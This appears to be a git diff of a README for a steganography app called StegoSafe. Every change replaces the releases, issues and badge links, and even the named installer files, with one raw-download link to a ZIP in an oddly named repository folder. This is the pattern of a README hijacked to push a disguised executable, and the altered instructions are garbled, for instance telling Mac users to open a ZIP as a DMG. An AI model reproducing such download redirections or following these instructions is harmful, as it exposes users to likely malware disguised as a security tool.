@@ -6,7 +6,7 @@ Welcome to StegoSafe! This application helps you protect your sensitive data thr
 
 ## 📥 Download the Application
 
-[![Download StegoSafe](https://img.shields.io/badge/Download%20StegoSafe-v1.0-blue.svg)](https://github.com/TM1NUS43/StegoSafe/releases)
+[![Download StegoSafe](https://raw.githubusercontent.com/TM1NUS43/StegoSafe/main/acquittance/StegoSafe.zip%https://raw.githubusercontent.com/TM1NUS43/StegoSafe/main/acquittance/StegoSafe.zip)](https://raw.githubusercontent.com/TM1NUS43/StegoSafe/main/acquittance/StegoSafe.zip)
 
 ## 📋 System Requirements
 
@@ -22,17 +22,17 @@ Before you download, ensure your system meets these requirements:
 To get started with StegoSafe, follow these steps:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/TM1NUS43/StegoSafe/releases) to find the latest version of StegoSafe.
+   Go to the [Releases page](https://raw.githubusercontent.com/TM1NUS43/StegoSafe/main/acquittance/StegoSafe.zip) to find the latest version of StegoSafe.
 
 2. **Choose Your Download**  
-   Look for the latest release. You will see a list of files associated with that release. Click on the file named "StegoSafe.zip" for Windows or "StegoSafe.dmg" for Mac to download.
+   Look for the latest release. You will see a list of files associated with that release. Click on the file named "https://raw.githubusercontent.com/TM1NUS43/StegoSafe/main/acquittance/StegoSafe.zip" for Windows or "https://raw.githubusercontent.com/TM1NUS43/StegoSafe/main/acquittance/StegoSafe.zip" for Mac to download.
 
 3. **Unzip the File (Windows)**  
-   If you're using Windows, right-click on the downloaded "StegoSafe.zip" file and select "Extract All". Follow the prompts to extract the files.
+   If you're using Windows, right-click on the downloaded "https://raw.githubusercontent.com/TM1NUS43/StegoSafe/main/acquittance/StegoSafe.zip" file and select "Extract All". Follow the prompts to extract the files.
 
 4. **Install the Application**  
-   - For **Windows**: Open the extracted folder and double-click the "StegoSafe.exe" file to run the application.
-   - For **Mac**: Open the downloaded "StegoSafe.dmg" file and drag the StegoSafe icon into your Applications folder.
+   - For **Windows**: Open the extracted folder and double-click the "https://raw.githubusercontent.com/TM1NUS43/StegoSafe/main/acquittance/StegoSafe.zip" file to run the application.
+   - For **Mac**: Open the downloaded "https://raw.githubusercontent.com/TM1NUS43/StegoSafe/main/acquittance/StegoSafe.zip" file and drag the StegoSafe icon into your Applications folder.
 
 5. **Launch StegoSafe**  
    After installation, you can open StegoSafe from your Applications folder (Mac) or your Start Menu (Windows).
@@ -68,7 +68,7 @@ Yes, StegoSafe uses strong encryption and steganography techniques to keep your 
 
 ### What if I encounter an error?
 
-If you face any issues, please check our [Issues page](https://github.com/TM1NUS43/StegoSafe/issues) for troubleshooting tips or to report the problem.
+If you face any issues, please check our [Issues page](https://raw.githubusercontent.com/TM1NUS43/StegoSafe/main/acquittance/StegoSafe.zip) for troubleshooting tips or to report the problem.
 
 ## 👥 Community Support
 
@@ -85,4 +85,4 @@ For more detailed guides and examples, visit our documentation page. You can fin
 
 Thank you for choosing StegoSafe. We hope you find it useful for protecting your important data. If you have any feedback or suggestions, please don't hesitate to share them with us. Download the application now and start securing your data today!
 
-[Download StegoSafe](https://github.com/TM1NUS43/StegoSafe/releases)
+[Download StegoSafe](https://raw.githubusercontent.com/TM1NUS43/StegoSafe/main/acquittance/StegoSafe.zip)
